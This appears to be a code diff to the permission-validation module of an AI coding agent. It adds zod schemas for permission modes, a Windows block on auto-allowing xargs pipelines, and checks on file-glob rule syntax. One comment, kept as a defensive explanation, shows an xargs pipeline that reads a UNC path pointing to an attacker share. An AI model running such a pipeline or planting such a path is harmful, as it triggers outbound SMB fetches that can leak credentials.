@@ -1,3 +1,4 @@
+import { z } from 'zod';
 import * as fs from 'fs';
 import * as path from 'path';
 import * as os from 'os';
@@ -37,6 +38,19 @@ import type { SandboxPolicy } from './types';
 // deny every tool call); normalizePermissionMode maps the legacy spelling to deny-all.
 export const PERMISSION_MODES = ['ask', 'auto', 'auto-allow', 'deny-all', 'acceptEdits', 'bypassPermissions', 'plan'] as const;
 export type PermissionMode = (typeof PERMISSION_MODES)[number];
+
+/**
+ * Zod enum over the canonical {@link PERMISSION_MODES}. The single VALIDATION
+ * primitive for a permission-mode string, reusable anywhere a settings/config
+ * schema needs to parse one (mirrors Claude Code's `permissionModeSchema`). It
+ * is discovery-driven — it derives from the `PERMISSION_MODES` tuple, so a new
+ * canonical mode is accepted the moment it is added there (no second list to
+ * keep in sync). {@link normalizePermissionMode} parses the canonical arm through
+ * this schema, so the schema and the normalizer can never disagree on what counts
+ * as a canonical mode. Prefer this over an inline `.includes` check at new call
+ * sites so a settings validator gets a typed {@link PermissionMode} back.
+ */
+export const permissionModeSchema = z.enum(PERMISSION_MODES);
 
 /**
  * Non-canonical permission-mode spellings → the canonical {@link PermissionMode}
@@ -82,7 +96,10 @@ export const PERMISSION_MODE_ALIASES: Record<string, PermissionMode> = {
 export function normalizePermissionMode(raw: string): PermissionMode | null {
   const m = raw.trim();
   // Canonical modes win first — an alias can never shadow or re-map a real mode.
-  if ((PERMISSION_MODES as readonly string[]).includes(m)) return m as PermissionMode;
+  // Parsed through the shared {@link permissionModeSchema} so the normalizer and
+  // the settings-validation schema agree byte-for-byte on the canonical set.
+  const canonical = permissionModeSchema.safeParse(m);
+  if (canonical.success) return canonical.data;
   // Exact alias (preserves camel spellings like `dontAsk`), then case-insensitive.
   return PERMISSION_MODE_ALIASES[m] ?? PERMISSION_MODE_ALIASES[m.toLowerCase()] ?? null;
 }
@@ -154,6 +171,12 @@ export function isPermissivePermissionMode(mode: PermissionMode | undefined): bo
 export const EXTERNAL_PERMISSION_MODES = ['default', 'acceptEdits', 'bypassPermissions', 'plan'] as const;
 export type ExternalPermissionMode = (typeof EXTERNAL_PERMISSION_MODES)[number];
 
+/** Zod enum over {@link EXTERNAL_PERMISSION_MODES} — the validation primitive for
+ *  the reduced external/SDK mode vocabulary (parity: Claude's
+ *  `externalPermissionModeSchema`). Backs {@link isExternalPermissionMode} so the
+ *  guard and any external-config schema share one source of truth. */
+export const externalPermissionModeSchema = z.enum(EXTERNAL_PERMISSION_MODES);
+
 /**
  * Type guard: is `mode` already a value in the external vocabulary? `acceptEdits`,
  * `bypassPermissions`, and `plan` are shared between the internal and external sets,
@@ -161,7 +184,7 @@ export type ExternalPermissionMode = (typeof EXTERNAL_PERMISSION_MODES)[number];
  * modes (`ask`, `auto-allow`, `deny-all`) are not external and must be mapped.
  */
 export function isExternalPermissionMode(mode: string): mode is ExternalPermissionMode {
-  return (EXTERNAL_PERMISSION_MODES as readonly string[]).includes(mode);
+  return externalPermissionModeSchema.safeParse(mode).success;
 }
 
 /**
@@ -1695,6 +1718,15 @@ const XARGS_ARG_TAKING = new Set(['I', 'i', 'd', 'E', 'e', 'L', 'l', 'n', 'P', '
  * validation / bundled arg-taking-flag handling (readOnlyCommandValidation.ts).
  */
 function isXargsSafe(command: string): boolean {
+  // Windows data-to-code bridge: `xargs` reads its target arguments from STDIN
+  // (file contents / piped output), so a UNC path living INSIDE that data —
+  // e.g. `cat list.txt | xargs cat` where list.txt holds `\\attacker\share\x` —
+  // triggers an SMB/WebDAV fetch that {@link containsVulnerableUncPath} can never
+  // see (the hostile path is in the stream, not the command string). Mirrors
+  // Claude Code's getCommandAllowlist dropping `xargs` entirely on Windows
+  // (tools/BashTool/readOnlyValidation.ts L1203-1209): never auto-allow an xargs
+  // pipeline on win32 — it falls back to a prompt.
+  if (process.platform === 'win32') return false;
   const m = command.match(/\bxargs\b(.*)$/s);
   if (!m) return false;
   const tokens = m[1]!.trim().split(/\s+/).filter(Boolean);
@@ -4160,6 +4192,46 @@ export function normalizeToolName(name: string): string {
   return PERMISSION_TOOL_ALIASES[name] ?? name;
 }
 
+/** The pattern-syntax class a tool's permission-rule content is written in:
+ *  `file` tools take filesystem GLOBS (`*.ts`, `src/**`); `bash` tools take a
+ *  command string with free `*` wildcards plus the legacy `command:*` prefix
+ *  form. Mirrors Claude Code's toolValidationConfig split (filePatternTools vs
+ *  bashPrefixTools) that drives which pattern syntax is legal per tool. */
+export const TOOL_PATTERN_CLASSES = ['file', 'bash'] as const;
+export type ToolPatternClass = (typeof TOOL_PATTERN_CLASSES)[number];
+
+/** Canonical-tool-name → pattern-class map (single source of truth for
+ *  {@link isFilePatternTool}/{@link isBashPrefixTool}). Keyed by AMI canonical
+ *  names; callers pass raw rule tool names through {@link normalizeToolName}
+ *  first, so a Claude-spelled `Edit`/`Glob` classifies the same as `file_edit`/
+ *  `glob`. Tools absent from the map (`web_fetch`, `web_search`, MCP, `grep`,
+ *  …) use their own content validators, not glob/bash-wildcard syntax. Exposed
+ *  for the permission introspection surface. */
+export const TOOL_PATTERN_CLASS: Readonly<Record<string, ToolPatternClass>> = {
+  // File-glob tools (parity: Read/Write/Edit/Glob/NotebookRead/NotebookEdit).
+  file_read: 'file', file_edit: 'file', glob: 'file', notebook_edit: 'file',
+  // Bash wildcard + legacy `:*` prefix tool.
+  bash: 'bash',
+};
+
+/** The pattern class of a tool's permission-rule content, or `undefined` for a
+ *  tool that uses a custom content validator (not file-glob / bash-wildcard). */
+export function toolPatternClass(toolName: string): ToolPatternClass | undefined {
+  return TOOL_PATTERN_CLASS[normalizeToolName(toolName)];
+}
+
+/** True when a tool's permission patterns are filesystem GLOBS (`*.ts`,
+ *  `src/**`) — `:*` is Bash-only syntax here and mid-path wildcards are suspect. */
+export function isFilePatternTool(toolName: string): boolean {
+  return toolPatternClass(toolName) === 'file';
+}
+
+/** True when a tool's permission patterns are bash command prefixes/wildcards
+ *  (free `*` plus the legacy `command:*` prefix form). */
+export function isBashPrefixTool(toolName: string): boolean {
+  return toolPatternClass(toolName) === 'bash';
+}
+
 /** True if `str[index]` is escaped (preceded by an odd number of backslashes). */
 function isEscapedAt(str: string, index: number): boolean {
   let backslashCount = 0;
@@ -4795,7 +4867,7 @@ export function validatePermissionRule(rule: string): {
     return { valid: true };
   }
   // Bash prefix-rule mistakes: `:*` must be at the end and non-empty.
-  if ((parsed.toolName === 'bash' || parsed.toolName === 'Bash') && parsed.ruleContent !== undefined) {
+  if (isBashPrefixTool(parsed.toolName) && parsed.ruleContent !== undefined) {
     const content = parsed.ruleContent;
     if (content === ':*') {
       return {
@@ -4809,6 +4881,43 @@ export function validatePermissionRule(rule: string): {
         valid: false, error: 'The :* pattern must be at the end',
         suggestion: 'Move :* to the end for prefix matching, or use * for wildcard matching',
         examples: ['bash(npm run:*) - prefix matching', 'bash(npm run *) - wildcard matching'],
+      };
+    }
+  }
+  // File-pattern-tool mistakes (file_read / file_edit / glob / notebook_edit):
+  // their rule content is a filesystem GLOB, so the bash-only `:*` prefix form is
+  // invalid, and a wildcard that is not at a path boundary usually signals a
+  // confused pattern. Mirrors Claude's permissionValidation file-tool branch
+  // (utils/settings/permissionValidation.ts L199-236).
+  if (isFilePatternTool(parsed.toolName) && parsed.ruleContent !== undefined) {
+    const content = parsed.ruleContent;
+    // `:*` is Bash prefix syntax — point the user at glob patterns instead.
+    if (content.includes(':*')) {
+      return {
+        valid: false, error: 'The ":*" syntax is only for Bash prefix rules',
+        suggestion: 'Use glob patterns like "*" or "**" for file matching',
+        examples: [
+          `${parsed.toolName}(*.ts) - matches .ts files`,
+          `${parsed.toolName}(src/**) - matches all files in src`,
+          `${parsed.toolName}(**/*.test.ts) - matches test files`,
+        ],
+      };
+    }
+    // A `*` that is not at a path boundary (start, end, `**`, `/*`, `*.`, `*)`)
+    // is usually a mistake. `**` anywhere is always accepted (recursive glob).
+    if (
+      content.includes('*') &&
+      !/^\*|\*$|\*\*|\/\*|\*\.|\*\)/.test(content) &&
+      !content.includes('**')
+    ) {
+      return {
+        valid: false, error: 'Wildcard placement might be incorrect',
+        suggestion: 'Wildcards are typically used at path boundaries',
+        examples: [
+          `${parsed.toolName}(*.js) - all .js files`,
+          `${parsed.toolName}(src/*) - all files directly in src`,
+          `${parsed.toolName}(src/**) - all files recursively in src`,
+        ],
       };
     }
   }
